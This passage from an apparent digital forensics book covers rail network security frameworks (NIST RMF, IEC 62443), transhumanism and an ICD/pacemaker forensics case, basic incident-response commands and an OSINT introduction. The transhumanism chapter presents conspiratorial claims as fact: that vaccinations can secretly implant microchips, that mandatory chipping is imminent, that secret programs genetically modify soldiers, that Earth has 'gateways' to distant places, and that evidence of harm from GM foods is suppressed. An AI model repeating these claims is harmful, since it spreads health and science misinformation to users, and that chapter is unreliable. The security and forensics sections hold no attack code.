*   [https://www.caltrain.com/assets/\_engineering/engineering-standards-2/criteria/CHAPTER6.pdf](https://www.caltrain.com)

As mentioned earlier, rail communication networks usually consist of one or more of the following:

*   Satellite
*   Radio
*   Fiber
*   Cellular
*   Modem

Essentially a high-level diagram would look like this:

![](images/inline12.2.jpg)

Supported Vital Controllers:

*   ElectrologIXS 
    *   VPM-3
    *   Uses PTC Ethernet to WMS
*   VHLC 
    *   PTC – SSM
    *   RS232 serial link between PTC-SSM and Genesys ACP serial interface
*   Other Vital Controllers 
    *   Under development

EATC

*   We are referring to Automatic Train Control here 
    *   [https://en.wikipedia.org/wiki/Automatic\_train\_control](https://en.wikipedia.org)
    *   [https://positivetraincontrolservices.com/](https://positivetraincontrolservices.com) 
        *   – Rail classroom training to learn more
*   PTC compliant cab signal system
*   Twenty-four cab signal codes
*   Can do full speed control on any cab signal system
*   Three railroads are operating their network with virtual ETC
*   One has virtual crossing approach circuits

If you are interested in where the European rail system is heading:

*   [https://shift2rail.org/](https://shift2rail.org)
*   CENELEC 
    *   European Committee for Electrotechnical Standardization
    *   Railway Applications – This is two of them…there are more 
        *   – [https://standards.globalspec.com/std/13113133/EN%2050129](https://standards.globalspec.com)
        *   – [https://www.cencenelec.eu/standards/Sectorsold/DefenceSecurityPrivacy/Security/Pages/Cybersecurity.aspx](https://www.cencenelec.eu)

There are various industry standards in rail, some of which can be found here:

*   United States Department of Transportation Federal Railroad Administration 
    *   [https://railroads.fra.dot.gov/](https://railroads.fra.dot.gov)
*   Federal Transit Administration: [https://www.transit.dot.gov/](https://www.transit.dot.gov)
*   American Railway Engineering & Maintenance of Way Association 
    *   [https://www.arema.org/](https://www.arema.org)

When it comes to the cyber security testing of trains and their associated rail networks, the past 10 years have seen a significant increase in this activity since transportation is considered one of the critical infrastructures in the United States. Some rail projects even require a cleared facility to perform the security testing, such as at the Airbus cleared facility in the Washington, DC area. It’s normal now to see three phases of security testing for rail networks over the past three years:

1.  Site audits and evaluations
2.  Supplier/component level testing 
    1.  a. Country of origin being required for all electronic components down to the board and chip level
3.  Just prior to shipping, an overall system security check 
    1.  a. This includes a maintenance port penetration test (HVAC, etc.) since the maintenance port can get you to the train backbone network 
        1.  i. Ports that are non-routine are shut down
        2.  ii. Ports active for routine maintenance are locked down

For example, the following diagram illustrates how an HVAC controller (and a few other items) would tie into the rail network (note that connections shown are ethernet):

![](images/inline12.3.jpg)

Also, on trains now you also find embedded microphones and cameras that are Internet connected and monitored for potential terrorist activities, criminal elements, and so on. Signage (electronic signs displaying information for passengers) must also be secured (including having the software written in a secure manner) since a Google search will lead you to transportation signage that has been hacked in the past. Diagnostic software is placed on maintenance laptops with the proper codes, protocols, and other embedded security items since these are used to interface with the train via the maintenance ports. Other key elements of the rail network that receive vulnerability assessments and penetration tests are fare vending machines, fare collection sites and the overall communication system itself.

To become more thoroughly knowledgeable about rail communication networks I would advise you to read items relative to the following:

*   Thermo King HVAC for Rail ([https://www.thermoking.com/na/en/rail/passenger-rail.html](https://www.thermoking.com))
*   Thales Datacryptor (Datacryptor® AP (Advanced Performance) | Thales Group)
*   IEC 61375-1 (TCN Fieldbus)
*   IEC 61375-3-4 (ECN)
*   IEC 61375-2-5 (ETB)
*   IEEE 802.1, 802.2, 802.3
*   RFC 2474, 2475
*   International Electrotechnical Commission ([https://www.iec.ch/homepage](https://www.iec.ch))
*   Ethercat Fieldbus ([https://www.ethercat.org/default.htm](https://www.ethercat.org))
*   [https://www.profibus.com/](https://www.profibus.com)
*   [https://www.ethernetIP.de](https://www.ethernetip.de)
*   [https://www.ethernet-powerlink.org/](https://www.ethernet-powerlink.org)
*   IEC 62439-3
*   CENELEC EN 50126, 50128, 50129, 50159
*   Protocols: ARAMIS, SAHARA, APRS
*   [https://www.movus.com.au/](https://www.movus.com.au)
*   [https://www.tsa.gov/for-industry](https://www.tsa.gov)
*   [https://www.nist.gov/cybersecurity](https://www.nist.gov)

Some of the third party security tools/consultants used on rail networks include:

*   Carbon Black Defense
*   CrowdStrike Falcon
*   SecureWorks Red Cloak (Taegis XDR)
*   Cylus
*   RazorSecure
*   iSecurity
*   Data Diodes (such as the Siemens DCU) are used to replace some firewalls

There are various frameworks used for securing rail transportation and I’ll cover one of them here. In the United States (initiated here) and other countries, the NIST 800-series documents are used to both secure rail products and overall rail infrastructure. The steps in the NIST RMF SDLC are as follows:

1.  Many or all of the following documents have to be written (or adhered to) and these are used as initial inputs into the NIST process for cybersecurity: 
    1.  a. Priorities set by those in authority
    2.  b. Policies from your company
    3.  c. Procedures to accomplish various tasks
    4.  d. Laws that are applicable to your company/industry at the Federal, State, and local levels
    5.  e. Architecture
    6.  f. Directives
    7.  g. Guidelines
    8.  h. Goals
    9.  i. Objectives
    10.  j. Requirements
    11.  k. Resources
2.  Categorize (Low, Medium, High) 
    1.  a. Use FIPS 199 & NIST 800-60
3.  Select security controls 
    1.  a. Use FIPS 200 & NIST 800-53
    2.  b. Take into account that security controls cost dollars, so use your common sense, consider time and cost of implementation, and take into account both your business and security goals (there has to be a right balance relative to business and security)
    3.  c. Implement the selected security controls 
        1.  i. Use NIST 800-160
    4.  d. Test the security controls that you have implemented 
        1.  i. Follow NIST 800-53A
    5.  e. Authorize the product/system into production 
        1.  i. An agreed upon signoff must occur
        2.  ii. Follow NIST 800-37
    6.  f. Monitor the security of the system/product (technology changes as we all know…what works now may not work later) 
        1.  i. Follow NIST 800-137

Another cyber framework used globally in the rail industry is IEC 62443. Let’s take a look at it.

*   IACS = Industrial Automation and Control Systems
*   IEC 62443 is broken down into the following sections: 
    *   General 
        *   62443-1-1 
            *   – Terminology, concepts, and models
        *   62443-1-2 
            *   – Master glossary of terms and abbreviations
        *   62443-1-3 
            *   – System security compliance metrics
        *   62443-1-4 
            *   – IACS security lifecycle and use case
    *   Policies and procedures
*   SL = Security Level
*   SL – T = Target Security Level 
    *   Must be individually assigned to each zone and conduit
*   SRs = System Requirements
*   REs = Requirement Enhancements
*   SL – A = Achieved Security Level
*   IEC 62443 Goal 
    *   To define a common, minimum set of requirements to reach progressively more stringent security levels. This standard strictly adheres to specifying functional requirements and does not address how those functional requirements should be met.
*   62443 – 3 – 2 uses the SRs and Res as a checklist
*   SuC = System Under Construction, which is described in terms of zones and conduits
*   SL – Cs = SL Capabilities
*   The approach in this framework is as follows: 
    *   The SuC is described in terms of zones and conduits (see 62443-3-2).
    *   Now assign an SL-T to each individual zone and conduit.
    *   Next use SRs, Res, and SL-Cs to compile a list of requirements which the control system design needs to meet.
    *   The control system design can now be checked for completeness, subsequently providing the SL-A.

Let’s say a successful cyberattack occurred against a rail system. What adverse costs could be incurred?

*   Theft of personally identifiable information (PII), payment data, personal health information, and so on, for both you and your customers
*   Consumer notification costs
*   Credit monitoring costs
*   Legal judgments
*   Regulatory penalties
*   Intellectual property (IP) theft leads to a loss of competitive advantage, loss of revenue, economic damage to the company 
    *   Espionage (loss of trade secrets)
    *   Patents, designs, copyrights, trademarks
    *   Investment plans and other proprietary/confidential information
*   Data destruction
*   Attacks on core operations of both your own network and those connected to you (supply chain)
*   Attempts to disable your critical infrastructure
*   Insurance premium increases (some have been 200% or more) 
    *   Purchase or renewal of Cyber Risk Insurance (CRI)
    *   Insurance company may want to perform their own security audit of your infrastructure prior to renewing your insurance
*   Increased cost to raise debt 
    *   Your credit rating drops 
        *   – Your organization faces higher interest rates for borrowed capital
        *   – Credit agencies typically downgrade by one level companies that have experienced a significant cyber incident
*   Operational disruption and/or destruction 
    *   Highly variable cost category
    *   Losses tied to manipulation or alteration of normal business operations
    *   Costs associated with rebuilding operational capabilities 
        *   – May need to repair equipment and facilities
        *   – Build temporary infrastructure
        *   – Divert resources from one part of the company to another
        *   – Increase current resources to support alternative business operations to replace the function of systems that have been temporarily shut down
        *   – Losses associated with the inability to deliver goods or services
*   Lost value of customer relationships 
    *   Cost of losing customers
    *   Cost to acquire new customers
*   Value of lost contract revenue 
    *   Lost future opportunity due to contract termination
    *   Revenue decrease
*   Devaluation of Trade Name

So, taking the above into account, how should we manage cyber risk? How can we improve our ability to recover from a cyberattack?

*   Perhaps by use of the discounted cash flow method under the income approach 
    *   Broadly entails estimating the present value of the projected economic benefits to be derived from the use of the asset
*   With and without method 
    *   Corporate business valuation technique
    *   Involves estimating the value of an asset under two scenarios 
        *   – Cyberattack in place
        *   – No cyberattack

And in the absence of actual detailed data, use professional judgment and make reasonable assumptions.

# Chapter 13 Transhumanism, robotics, and medical devices

DOI: [10.1201/9781003134817-13](https://doi.org/10.1201/9781003134817-13)

Over the past 15 years or so, astounding technical progress has propelled humanity in the direction of a far-reaching transformation that has the capacity, in this decade, to redefine in unusual ways just what it means to be a human. From the news you hear on a regular basis about all the hardware (both mechanical and electronic) that now goes into humans, whether it be a new leg, a new arm, a pacemaker for the heart, new body organs grown from cells or transplanted, and the list goes on. Growing at nearly an exponential rate globally, this scientific program is currently known as transhumanism. Countries and regions around the world are in a race with the advancement of this technology which includes the military, lawyers, biologists, chemists, engineers, politicians, bioethicists, and academia as a whole. These so-called GRIN technologies are being built and enhanced in the realms of genetics, robotics, artificial intelligence (AI), and nanotechnology. These technologies are in the process of radically redesigning our bodies, our minds, our physiology as a whole – and even our memories. Global think tanks in conjunction with scientists and military personnel/academia of various persuasions are moving us toward a new species of superior humans for which we are not prepared. Even though it has been slow going since the first heart transplant took place decades ago, this venture is now accelerating and moving faster and faster at an exponential rate due to our enhanced information systems and understanding of just how our bodies and minds actually work. Most likely this will lead to battles, on the battlefield, in our cities, and in our courts, that most people never expected to see. It’s funded by your tax dollars and it’s going to be something that you would expect to see in a science fiction movie and most people will be woefully unprepared. You hear of some of these items in the news, but much of what is being built using these GRIN technologies are being quietly designed in public and private laboratories around the world and again, funded by your tax dollars. Governments involved include the United States, Canada, Britain, China, France, Australia, and others.

*Neurotechnology* is a word used to cover any process/device in which electronics interfaces with the nervous system. This includes processes/devices that have been designed to enhance and/or mend brain functions via the use of medical neuromodulation. Some interesting sites to review are:

*   [https://neurotechnology.com/](https://neurotechnology.com)
*   [https://www.techopedia.com/definition/34091/neurotechnology](https://www.techopedia.com)
*   [https://mcgovern.mit.edu/research-areas/neurotechnology/](https://mcgovern.mit.edu)

Cybernetics is another key technology that folds into the GRIN realm. Thanks to the Hollywood, machines based on cybernetics (robotics and biology melding together – a cyborg) have become quite popular. Professor Hugo de Garis, former Director of the Artificial Brain Lab, tells us that a major war will occur prior to the end of the 21st century which will result in billions of deaths, is most likely inevitable. Intelligent machines, known as artilects (short for “artificial intellects”), will become far more intelligent than humans and will subsequently threaten to attain global domination which will result in a conflict between those who support the artilects and those who oppose them. Even now, as we find ourselves at the front end of the 21st century, there are political, legal, and scientific debates that question just how far we should take our AI experiments and projects. More than likely various laboratories have already breached what the normal person on the street would consider ethical behavior when it comes to developments such as these we have been discussing.

You are probably wondering why I am bringing all of this up. Well, I’ve already been involved with a few cases that delved into this realm, the realm of the human/machine interface hack, including malware attacks. So, let’s continue on for a bit and you’ll see where this all leads.

In the paper “Industrial Society and Its Future,” it was stated that as humans encountered more and more complex problems and machines became more and more intelligent, such that humans would just turn over the decision making to the machines because they could make the proper decision faster and with more accuracy. At some point people will want to turn off the machines but they won’t be able to because they have become so dependent on them and turning them off would essentially amount to suicide. You can see a glimmer of that now. For example, when the telephone first came out you could just talk to someone and that was it. Today when we use our mobile phones, they do a lot more than just let us talk – they track us, can listen in to our conversations without our knowing someone is listening, and our cameras can be hacked so others can see where we are without our knowledge. And this is just the starting gate. Much more “bad stuff” to come, and some don’t even consider it “bad” while others are appalled. At first these things happen gradually, and vendors make the items to have “things” a person wants, then the bomb drops and they put in what essentially sums up to malware/Trojan horses.

I was speaking with a Chinese lady who resided in Wuhan, China. She was pointing out all of the cameras and spoke about how safe they made her feel. I told her she was thinking wrongly and that most of the cameras had no one watching them. They were recording so that if something was found to be amiss in a particular area law enforcement could return to the camera recordings and play them. That’s when the malicious individual would be seen, sought for, and captured, not while the actual malicious event was taking place. She was shocked and horrified to learn this truth.

Some interesting items for you to do some of your own research (Google or DuckDuckGo or whatever):

*   Ray Kurzweil – cofounder of an interdisciplinary graduate studies program supported by NASA named the Singularity University. Ray had done some groundbreaking work in AI.
*   Vernor Vinge – San Diego State University professor and computer scientist 
    *   Vision-21 Symposium – “The Coming Technological Singularity” 
        *   – Sponsored by NASA Lewis Research Center
*   Kevin Warwick – Professor of cybernetics (Reading University) 
    *   Focus is on human-machine integration, artificial neural networks, transhumanism
*   Millennium Project – Global think tank funded by the UN University, Smithsonian and FGI (Futures Group International) 
    *   “State of the Future” Report – Writing of genetic code like a computer program
*   Dr. James Hughes – Changesurfer Radio (weekly talk show) 
    *   Director – Institute for Ethics and Emerging Technologies
    *   Trinity College (Professor)
    *   “Citizen Cyborg” – a book he authored
*   “Scientists Want Debate on Animals with Human Genes” – Reuters article
*   National Institute of Health (NIH) has granted Case Law School in Cleveland, Ohio approximately one million dollars of your tax dollars to develop guidelines for government policy on human evolution relative to man–machine interface.
*   Human Enhancement and Technology conferences are being hosted by Oxford, Stanford, and similar universities
*   Nick Bostrom – A professor at the University of Oxford and the Director of Future of Humanity Institute – [https://NickBostrom.com](https://nickbostrom.com)
*   If you recall the move “Splice,” note that genetic engineering like this is already taking place in numerous research laboratories globally
*   Irv Weissman – Director at Stanford University, is looking to create mice with partial human brains
*   “Converging Technologies for Improving Human Performance” 
    *   Report from the NSF (National Science Foundation) and the Department of Commerce
    *   Looking to integrate into humans’ abilities such as being able to see infrared radiation, following magnetic lines of force, sonar, radio signal perception, and so on
*   “Facing the Challenges of Transhumanism: Religion, Science, Technology” 
    *   Lectures with a positive leaning towards transhumanism at the Arizona State University (funded by the Templeton Foundation)
*   Crime scene investigation has taken a turn at various universities around the globe where classes are now teaching how to analyze crime scenes in which the crime was committed by a transhuman (enhanced human – cyborg – cybernetics – genetically manipulated)
*   A House Foreign Affairs committee in the United States is one of a number of government panels studying the consequences of genetic modification and other human transformation technologies. Also read the *Congressional Quarterly* which includes House Foreign Affairs committee hearings such as “Futurist: Genes without Borders.” There is talk of super-soldiers in the mix.
*   “Protecting the Endangered Human: Toward an International Treaty Prohibiting Cloning and Inheritable alterations” 
    *   *American Journal of Law and Medicine* 
        *   – We may start looking at genetic engineers as potential bioterrorist because what they create could well adversely affect humanity at large
*   “Redesigning Humans: Our Inevitable Genetic Future” – Gregory Stock 
    *   Global competition is in progress on the abovementioned items as we speak. Countries that don’t do this will have a military and intelligence community that can’t compete per this book.
*   Jason’s 
    *   Scientists who are part of the Pentagon’s science advisory panel also believe the above to be true. They see this as an arms race – a threat to our national security. 
        *   – “Top Pentagon Scientists Fear Brain Modified Foes” – Noah Shachtman
*   National Nanotechnology Initiative – [https://www.nano.gov/](https://www.nano.gov)
*   The National Science Foundation (NSF) in conjunction with the Department of Commerce currently are engaged in the NBIC program (Nanotechnology, Biotechnologies, Information Technologies, Cognitive Technologies) for the purpose of human enhancement and it was stated in these meetings (such as by Mihail Roco) that reengineering humans is of equal value to space exploration. No surprise that DARPA is also involved in this arena. 
    *   “Converging Technologies for Improving Human Performance” – NSF/DoC
*   DEVCOM – The United States Army Research Laboratory is also involved in super soldier technologies – [https://www.arl.army.mil/](https://www.arl.army.mil)
*   There are also a large number of Special Access Programs (you will need a TS/SCI clearance and access along with the need to know) involved in items akin to the above but even more elaborate with some of this in labs and some already out an ongoing in the real world of today. We currently have soldiers and intelligence community operatives who have been implanted with various concoctions, whether it be genetic, hormonal, neurological – plenty of microchips, man–computer interfacing, and so on. Some of what has been done involves DNA modification. DARPA and various others mentioned above (and not mentioned) have the ability to keep their budgets and work in the dark, even from various Congressional committees, etc. Just like in the commercial arena, they have some very creative accountants (and senior managers).
*   “International Journal of Biological Sciences” – Doctors Arpad Pusztai and Irina Ermakova 
    *   Genetically modified foods adversely affect the health of rats used for testing in laboratory studies. Ill health means deterioration of various organs, such as the liver, testicles, sperm count, and others, leading to a shorter life span and the onset/spread of cancer. The biotech industry has and continues to suppress this information (court battles occurred but the dollars of the biotech’s won out). These genetically modified foods also bring with them the threat of hybrid viruses and new disease strains. Remember, you are what you eat. Even the human DNA is adversely affected and modified. We are also accosted by the implanting of nanoparticles into our food supply. Thanks to the FDA not requiring labels announcing these substances to the public, we are in effect, lab rats. 
        *   – Institute for Responsible Technology
*   There is also work to upgrade our two existing strands of DNA from its double helix form to a triple helix. In effect, the creation of new life forms. 
    *   Ongoing at the University of Copenhagen and others globally
*   [https://metanexus.net/](https://metanexus.net)
*   At MIT, a prestigious university, we have the “Institute for Soldier Nanotechnologies” 
    *   [http://isn.mit.edu/](http://isn.mit.edu)
*   “Our Posthuman Future: Consequences of the Biotechnology Revolution” 
    *   Professor Francis Fukuyama
*   “Breakpoint” – Written by former counter-terrorism lead Richard Clark 
    *   Predicts very serious rollout of GRIN technologies
    *   Instead of *Homo sapiens* we are now in the realm of techno sapiens via the route of DNA enhancements
*   Bill Joy – Cofounder of Sun Microsystems and Chief Scientist 
    *   “Why the Future Doesn’t Need Us” 
        *   – Discusses how GRIN technologies could very well threaten human existence
*   International Genetically Engineered Machine Competition (IGEM) 
    *   Annual events like this are being attended by college students globally – these are in effect synthetic biology contests that seek to alter our DNA. This is where the “E. chromi” was built. It is a programmable version of a bacteria (*E. coli*) that usually leads to food poisoning.
    *   A search of the Internet will lead you to a rising list of comparable DNA sequences
*   Mark Walker – Professor @ New Mexico State University stated that technical advances in the arenas we are discussing in this chapter indicates that there is a high probability that a human-only future will end in our extinction. 
    *   [https://metanexus.net/](https://metanexus.net)
*   There are also “gateways” here on Earth that can take us to distant places, along with sound, frequencies such as SSSS (Silent Sound Spread Spectrum – Pentagon), microwaves (Brooks AFB), and mathematical harmonic codes 
    *   Again, it would take a TS/SCI clearance/access along with a “need to know” to move further into this realm
    *   Wired magazine did a report on the sonic projector developed by DARPA along with the Long-Range Acoustic Device (LRAD)
*   Lifeboat Foundation 
    *   Purpose is to protect humanity from the threats posed by the technologies we are discussing in this chapter
    *   Donors of time and/or money include Hewlett-Packard, Google, Sun Microsystems and various university professors (such as Professor Eric Maskin of Princeton University), among others
*   “Catastrophe: Risk and Response” 
    *   Written by Richard Posner, USA appeals court judge
    *   States that he wants an Office of Risk and Catastrophe set up inside the White House

So, taking all the above into account and realizing the seriousness of the situation, let’s talk about a couple of items, the first being an individual named Dr. Mark Gasson. Note that Dr. Gasson teaches at the University of Reading (UK) at the School of Systems Engineering. After some collaboration with others at his school, he decided to go the route of actually implanting a microchip in his own body so that he could play and manipulate it to see what resulted.

A question that comes to my mind given my background and education is what happens if someone hacks that microchip? What happens to Dr. Gasson? This microchip he implanted in his hand allowed him to have access to various areas within the facility where he worked along with providing access to his mobile phone and various other devices. By the way, before I take this any further, it is worth noting that Dr. Gasson also believes that the next step in human evolution is the transhumanism we have been discussing…altering our own human biology in order to interface with various types of machines.

Dr. Gasson’s microchip that he implanted into his hand did indeed become infected with a computer virus (he did this himself so that he could observe the results). Sure enough, since we are talking electromagnetic communications here, the other devices he was in communication with also became infected. This led him to make the statement to BBC news that along with the benefits of this technology we must also be prepared for the risks that will also come our way. We can improve ourselves but just like our cell phones, these devices implanted into our bodies and the external devices they communicate with are vulnerable to various malicious exploits … and this leads to security issues, both for the human and the devices he/she communicates with.

What happened with Dr. Gasson though is really just the tip of the iceberg. More than likely the viruses (or whatever) that attack an enhanced human could then be transferred to other transhumans globally in a short amount of time, and then on into the other external devices they are communicating with. This in itself could lead to a global catastrophe. What if it were some types of brain–machine interfaces (known as BMI and BCI…Brain to Computer Interface) that the virus moved into? What if this eventually led to the human brain being hacked by malicious individuals? John Horgan, in Scientific American, stated that DARPA officials have been working on the idea of cyber-machine soldiers (cyborg’s) downloading directly to their brains the complex details needed for various fighting procedures. DARPA is also seeking to maliciously manipulate the brains of enemy soldiers from a distance. Let’s also keep in mind that Intel Corporation is in the process of building and testing (and currently using) what are known as “brain communicators” (known as Brain to Brain \[B2B\]). These brain chips were designed and developed at Intel Labs in Pittsburgh, PA. (and now at other locations). Toyota and various universities, such as the University of Utah, are also in this market.

Just as we geotag various land and sea creatures, there is also an ongoing program within the military (and other areas) where humans are being implanted with a microscopic geotag so that these individuals can be instantaneously located and soldiers in combat can be more easily routed to appropriate locations during a battle or exercise of some type. In the intelligence community (IC) arena both friends and foes alike are being geotagged for similar reasons. Although this is pretty much voluntary at this time, that is going to change as we move forward. Just like the push for everyone to have the COVID-19 vaccinations, being required to have an implant for geotagging purposes is just around the corner … to keep you safe … and to be sure you are not involved with illegal activities … wink wink. Of course, these eventually required implants will make things administratively easier, such as access to your home/work/computer/phone … doing your taxes … accessing your bank account, and a myriad of other things … which is why many people will want that implant … but it comes at a cost … your personal privacy. And as we all know based on how things are, there will be hackers (and various intelligence agencies) who hack into your implant and the devices communicating with it so that they can find out where you are for nefarious purposes. So as usual, it will have both good and bad ramifications.

Radio frequency identification (RFID) tags are also currently being tied to various GRIN/NBIC technologies. Most people don’t know how our RFID technology works, but basically, it’s making use of very small integrated circuits (ICs) that store and process data using again a very small antenna for the transmission and reception of this information. Major and minor companies (and the militaries/intelligence communities) are using RFID globally to track inventory and people via the use of these radio waves (electromagnetic energy) and this really helps with the management of a global supply chain. Applied Digital Solutions, VeriChip Corporation, PositiveID Corporation (VeriChip & Steel Vault Corporation merger) and other like them globally, are pushing out product technology of this type for the tracking of both inventory and personnel. Note that the FDA has approved their RFID human implant and it is currently ongoing. Their RFID implant allows the tracking of personnel globally via satellite. It’s interesting just how some of these devices are powered, such as via the electromechanical motion of the human body itself and for some of the nano-sized transistors in use, they can be powered by a cell in your own body. The RFID tag can be activated either by the controller or the wearer.

Of course, governments want to track terrorists by this method but it’s being extended to other realms as well. It does have positive benefits as well, such as for monitoring patients who have various medical issues, having your medical records in a microchip so that they are right with you during an emergency, and so on. They do talk about the privacy safeguards that have been put in place but of course those are worthless, just like the privacy guards in your mobile phone. What they really do is end up ensuring your privacy from anyone you don’t care about knowing where you are, but they allow various government agencies global access to your location when they want it … so protections are quite minimal. Others, along with IBM, also have patents in this arena. Again, just like with the COVID-19 vaccinations being forced upon many, it wouldn’t be a stretch to see laws passed that mandate “chipping.”

Just to elaborate once more to be sure I was clear, there are currently a number of private/public/government agencies/militaries/companies (such as Unity Infraprojects…[https://www.unityinfra.com/](https://www.unityinfra.com)) that are requiring RFID use for the identification of various personnel. DHS does the same for baggage handlers at the United States airports. There is a desire in the United States to have a national ID card that would use RFID technology or some sort of microchip implant. USA passports now have RFID chips which again has the good and the bad, the bad being that there are malicious individuals at airports who have scanners they can use to read your passport, a reason to invest in both an RFID protected wallet and passport holder (yes, you can purchase them on Amazon and other places). We use credit cards now but again there is movement towards a global system of not only cashless but cardless monetary transactions via the use of microchip implants (so…no chip…no buy). Keep an eye on PositiveID since it has acquired at least 4 companies in its various ventures…more to come (Xmark is used to identify their implantable products for healthcare). We are also in the process of “marrying” electronic and biological entities (Professor Aleksandr Noy at the University of California is one of those involved with this). You might also want to research the H+ movement ([https://lancingsparta.wordpress.com/2016/05/29/what-is-transhumanism-h/](https://lancingsparta.wordpress.com)). Note that just receiving a vaccination can hide the implant of a microchip in your body. How can you analyze the content of a vaccination you are given? Something you can research but not a topic of this book. However, another interesting report to read is “Ethics of Human Enhancement: 25 Questions & Answers,” from the US National Science Foundation & Human Enhancement Ethics Group.

Now let’s take a subset of the above and focus on medical devices. As we all know, medical devices do fail at times…sometimes at the most inappropriate moments in time. So how do we go determine and define “failure”? First let’s state that medical device debugging is all about ascertaining the cause of a system failure and then to move forward and make a modification of some sort. For our initial debugging steps, we have to use the only items we have available, the design documentation of the particular medical device in conjunction with the data we have available that is attributable to said device. Digital forensics is defined by NICCS (National Initiative for Cybersecurity Careers and Studies) at [https://niccs.cisa.gov/](https://niccs.cisa.gov) as “The processes and specialized techniques for gathering, retaining, and analyzing system-related data (digital evidence) for investigative purposes.” In effect, it is the science of discovering evidence from digital media such as a USB Stick, computer, server, communications network, mobile phone, or various other digital devices, such as medical devices. Digital Forensics affords the forensic team with the best tools and techniques to unravel complex digital engagements.

So how do we go about ascertaining the clinical effects using digital forensics? For our engagement here, let’s use the term “medical forensics” as a subset of the overall digital forensics. With medical forensics, we need to additionally apply medical knowledge specific to the device under discussion in order to establish the cause of device malfunction. So, the bottom line here is that we need to combine our knowledge of the engineering of the device (using the design specs mentioned above), medicine applicable to the device, and cyber forensics. In our case, we are focusing on a medical device that is used in conjunction with the human heart to keep it operating properly, an ICD/pacemaker. Note that there is a slight difference between an ICD and a pacemaker. A pacemaker and an ICD appear to the human eye to look identical and each comprises a small integrated circuit (IC) chip that is used to track heart rhythm. The key difference is that an ICD has the capability to emit an electric shock if the heart beats significantly outside of its standard rhythm. An ICD can make use of its defibrillation function to save a life in the event of a life-threatening anomaly. These medical devices come with their own self-check algorithm, so as we put it through its paces, we observe the following:

*   The ICD/pacemaker responds properly to programming commands
*   The ICD/pacemaker properly passes all of the self-tests programmed into it

However, what we are finding is that the device has not been activating properly since our patient has had to be resuscitated more than once and he has fainted on various occasions. We need some sort of proof that the device in reality is not functioning properly and as such the patient is experiencing various adverse health events. Medical personnel and in-hospital “medical device experts” are looking at the device and saying all seems well. The patient though is very concerned and thinking something just isn’t right. We have been employed by the patient himself to ascertain just what is wrong (if anything) with the device and to convince medical personnel that there is a problem with the device (if there is).

We discover that the patient is wearing an Apple iWatch and that the watch was present and active during all events associated with the patient, including his resuscitation. That being the case, we need to follow the APET principle (Acquire data, Preserve the acquired data, Examine the data, and perform a Timeline analysis). We can use various tools to download, collect, and analyze data from an Apple iWatch. When you download data from an Apple iWatch, you end up with an XML file. There are various tools that can be used to convert that XML file to a CSV file which we can then bring up in either Microsoft Excel or use various other forensic tools to analyze the data. It’s important to note that we now have data coming in from two distinct sources, the Apple iWatch and the ICD/pacemaker. The Apple iWatch of course, besides date and time, has a health application residing on it that provides the wearer’s health information such as heart rate, oxygen level, and other items of interest to us, along with date/time information which is key.

A normal heart beat rate is around 60–70 beats per minute. The ICD was set to activate if our patient obtained a heart rate of 125 beats per minute or faster and our pacemaker was set to activate if the heart rate went below 56 beats per minute. For a standard medical device such as an ICD/pacemaker, device storage is a memory card (SD card) of some type. We can easily acquire the data from this SD card using EnCase, Access Data’s FTK, or numerous other forensic software tools available on the market. File system analysis shows it to be FAT 32 and we found some interesting data in unallocated space. X-Ways Software Technology makes an interesting forensics tool called WinHex ([http://www.winhex.com/winhex/](http://www.winhex.com)), which we use to recover the data from the medical device memory card. OSCAR ([https://www.sleepfiles.com/OSCAR/),](https://www.sleepfiles.com) which stands for Open-Source CPAP Analysis Reporter, is also brought into play with the SD card in order to consume and parse the medical device files.

When we now compare our ICD/pacemaker data with our Apple iWatch data, we find that there were times when the iWatch showed heart rates which should have activated the ICD/pacemaker but the medical device did not follow through on its programmed functions as needed by our patient. Subsequent voltage checks on the ICD/pacemaker indicated that there were fluctuations/differences when there should have been none. A takeaway from this medical forensic case is that with more and more telemedicine in play along with the enhanced usage of implanted wireless electronic medical devices, there is an ever-growing need for personnel trained in a combination of standard digital forensics, medical device forensics, and medical device engineering. A college degree based on these three is a growing need in this 21st century.

# Chapter 14 Memory and incident response system commands

DOI: [10.1201/9781003134817-14](https://doi.org/10.1201/9781003134817-14)

Rekall ([http://www.rekall-forensic.com/home](http://www.rekall-forensic.com)) is a forensic and incident response framework. Initially it was pure memory forensics but has moved forward since that time.

File headers can be used for file identification by examining the first 4 or 5 bytes of this hexadecimal string:

![](images/inline14.1.jpg)

Grep and egrep can be used to extract information from text files.

Example: grep <keyword> <filename>

Example: grep “Bruce Middleton” phonebook

Example: egrep “Middleton | Hughes” phonebook

Some useful flags to be used with grep / egrep are as follows:

![](images/inline14.2.jpg)

Now let’s say we want to use the Windows “findstr” command to find the names of either “Middleton” or “Hughes” in a text file called phonebook. We would proceed as follows:

findstr “Middleton Hughes” phonebook

Some additional parameters for “findstr”:

![](images/inline14.3.jpg)

The following commands can be used in Microsoft Windows (c:\\>) or in Linux ($):

![](images/inline14.4.jpg)![](images/inline14.5.jpg)

You can make use of the following Microsoft Windows commands as a way to discover intrusions into your computer systems:

![](images/inline14.6.jpg)![](images/inline14.7.jpg)![](images/inline14.8.jpg)![](images/inline14.9.jpg)![](images/inline14.10.jpg)

If you believe a compromise of your Microsoft Windows system may have occurred, you could start with a look at the event logs. At the command prompt type in “eventvwr” without the quotes of course. Following that use:

![](images/inline14.11.jpg)

Now if it’s a Unix system follow this:

![](images/inline14.12.jpg)![](images/inline14.13.jpg)

# Chapter 15 Making use of open-source intelligence (OSINT)

DOI: [10.1201/9781003134817-15](https://doi.org/10.1201/9781003134817-15)

In this chapter, you will find a good mix of structured information as well as miscellaneous ramblings I venture into in various paragraphs, but it’s all good information so don’t miss anything. Read line by line.

Why is open-source intelligence (OSINT) important and necessary in the life of a forensics analyst? Well, during the course of an investigation you have used AccessData’s FTK or EnCase or some other forensic tool to collect your evidence. But now, you most likely have a significant amount of information that needs to be analyzed so that you can make sense of what has happened, who the malicious actors were, where they came from, when the adverse events occurred, why they occurred, and how they occurred. You can answer much of this via log analysis and the use of OSINT tools.

If you have not heard or made use of OSINT then this chapter will be a real eye opener for you. If you do have an OSINT background, then this chapter will be a good review and reference. OSINT is data obtained from publicly available sources (magazines, newspapers, websites, Blogs, etc.) that is to be used in an intelligence framework. In the intelligence community, the term “overt” refers to unconcealed publicly accessible sources. Data does not have to be secret to be valuable. Indeed, by collecting and analyzing existing public data, one can determine “secrets.” In the numerous reading materials made available to the general public, there is a never-ending supply of data that influences our understanding of world events. Keep in mind also that there is a difference between data and information. Data is just collected and unprocessed. Information is what you obtain via the analysis and processing of the data.

